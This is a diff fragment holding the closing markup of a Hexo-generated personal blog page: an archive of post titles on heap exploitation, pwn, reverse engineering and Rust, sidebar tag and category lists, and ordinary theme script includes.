+            <span class="archive-post-date">01/25</span>
+            <a class="archive-post-title" href="/2024/01/25/How2Heap-5/">How2Heap(5)——Unsorted bin attack & House of Lore</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/23</span>
+            <a class="archive-post-title" href="/2024/01/23/%E5%93%88%E5%B7%A5%E5%A4%A7%E9%9D%92%E8%AE%AD%E8%90%A5%E8%AE%B0%E5%BD%95%E6%95%B4%E5%90%88%E5%8C%85/">青训营记录整合包</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/22</span>
+            <a class="archive-post-title" href="/2024/01/22/IO-FILE/">IO_FILE——File Stream Oriented Programming (1)</a>
+        </li>
+    
+        
+            
+            
+                
+                </ul>
+            
+            <div class="archive-year"> 2023 </div>
+            <ul class="year-list">
+            
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/30</span>
+            <a class="archive-post-title" href="/2023/12/30/How2Heap-4/">How2Heap(4)——House of Orange & House of Einhejar</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/27</span>
+            <a class="archive-post-title" href="/2023/12/27/ubuntu16-04-docker-%E5%AE%89%E8%A3%85pwndbg%E8%B8%A9%E5%9D%91%E5%A4%A7%E5%85%A8/">ubuntu16.04 docker环境踩坑</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/26</span>
+            <a class="archive-post-title" href="/2023/12/26/Rust-Rust-2/">Rust？Rust！(2)</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/17</span>
+            <a class="archive-post-title" href="/2023/12/17/How2Heap-3/">How2Heap(3)—House of Force & House of Gods.</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/14</span>
+            <a class="archive-post-title" href="/2023/12/14/Rust%EF%BC%9FRust%EF%BC%81-1/">Rust？Rust！(1)</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/03</span>
+            <a class="archive-post-title" href="/2023/12/03/How2Heap-2/">How2Heap(2)-Overlapping</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/25</span>
+            <a class="archive-post-title" href="/2023/11/25/linux%E6%9D%82%E8%B0%88%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/">linux杂谈（持续更新）</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/25</span>
+            <a class="archive-post-title" href="/2023/11/25/%E9%80%86%E5%90%91%E6%9D%82%E8%B0%88%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/">逆向杂谈（持续更新）</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/09</span>
+            <a class="archive-post-title" href="/2023/11/09/How2Heap-1/">How2Heap(1)-fastbin（完整版）</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/06</span>
+            <a class="archive-post-title" href="/2023/11/06/%E5%AF%B9%E8%B7%B3%E8%A1%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E5%85%B6%E9%9D%99%E6%80%81%E9%80%86%E5%90%91%E7%9A%84%E4%B8%80%E4%BA%9B%E6%83%B3%E6%B3%95/">对跳表机制及其静态逆向的一些想法</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/26</span>
+            <a class="archive-post-title" href="/2023/10/26/pwntools%E7%9A%84shellcode%E9%80%BB%E8%BE%91%E8%AF%A6%E8%A7%A3/">pwntools的shellcode逻辑详解</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/26</span>
+            <a class="archive-post-title" href="/2023/10/26/my-first-blog/">my_first_blog</a>
+        </li>
+    
+    </div>
+</div>
+
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+        
+            <span class="sidebar-tag-name" data-tags="CSAPP">
+                <span class="iconfont-archer">&#xe606;</span>
+                CSAPP
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="Lab">
+                <span class="iconfont-archer">&#xe606;</span>
+                Lab
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="Develop">
+                <span class="iconfont-archer">&#xe606;</span>
+                Develop
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="heap">
+                <span class="iconfont-archer">&#xe606;</span>
+                heap
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="pwn">
+                <span class="iconfont-archer">&#xe606;</span>
+                pwn
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="逆向">
+                <span class="iconfont-archer">&#xe606;</span>
+                逆向
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="wp">
+                <span class="iconfont-archer">&#xe606;</span>
+                wp
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="Rust">
+                <span class="iconfont-archer">&#xe606;</span>
+                Rust
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="FSOP">
+                <span class="iconfont-archer">&#xe606;</span>
+                FSOP
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="linux">
+                <span class="iconfont-archer">&#xe606;</span>
+                linux
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="shellcode">
+                <span class="iconfont-archer">&#xe606;</span>
+                shellcode
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="Others">
+                <span class="iconfont-archer">&#xe606;</span>
+                Others
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="IDA">
+                <span class="iconfont-archer">&#xe606;</span>
+                IDA
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="编译">
+                <span class="iconfont-archer">&#xe606;</span>
+                编译
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="ROP">
+                <span class="iconfont-archer">&#xe606;</span>
+                ROP
+            </span>
+        
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+        缺失模块，请参考主题文档进行安装配置：https://github.com/fi3ework/hexo-theme-archer#%E5%AE%89%E8%A3%85%E4%B8%BB%E9%A2%98
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="CSAPP">
+            <span class="iconfont-archer">&#xe60a;</span>
+            CSAPP
+        </span>
+    
+        <span class="sidebar-category-name" data-categories="pwn">
+            <span class="iconfont-archer">&#xe60a;</span>
+            pwn
+        </span>
+    
+        <span class="sidebar-category-name" data-categories="Develop">
+            <span class="iconfont-archer">&#xe60a;</span>
+            Develop
+        </span>
+    
+        <span class="sidebar-category-name" data-categories="linux">
+            <span class="iconfont-archer">&#xe60a;</span>
+            linux
+        </span>
+    
+        <span class="sidebar-category-name" data-categories="Reverse">
+            <span class="iconfont-archer">&#xe60a;</span>
+            Reverse
+        </span>
+    
+        <span class="sidebar-category-name" data-categories="others">
+            <span class="iconfont-archer">&#xe60a;</span>
+            others
+        </span>
+    
+        <span class="sidebar-category-name" data-categories="pwn">
+            <span class="iconfont-archer">&#xe60a;</span>
+            pwn
+        </span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+
+    </div>
+</div>
+
+        <!-- site-meta -->
+        <script>
+    var siteMetaRoot = "/"
+    if (siteMetaRoot === "undefined") {
+        siteMetaRoot = '/'
+    }
+    var siteMeta = {
+        url: "http://example.com",
+        root: siteMetaRoot,
+        author: "John Doe"
+    }
+</script>
+
+        <!-- import experimental options here -->
+        <!-- Custom Font -->
+
+
+        <!-- main func -->
+        <script src="/scripts/main.js?v=20211217"></script>
+        <!-- dark mode -->
+        <script src="/scripts/dark.js?v=20211217"></script>
+        <!-- fancybox -->
+        <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" defer></script>
+        <!-- algolia -->
+        
+        <!-- busuanzi -->
+        
+            <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+        
+        <!-- CNZZ -->
+        
+        <!-- async load share.js -->
+        
+            <script src="/scripts/share.js?v=20211217" async></script>
+        
+        <!-- mermaid -->
+        
+    </body>
+</html>
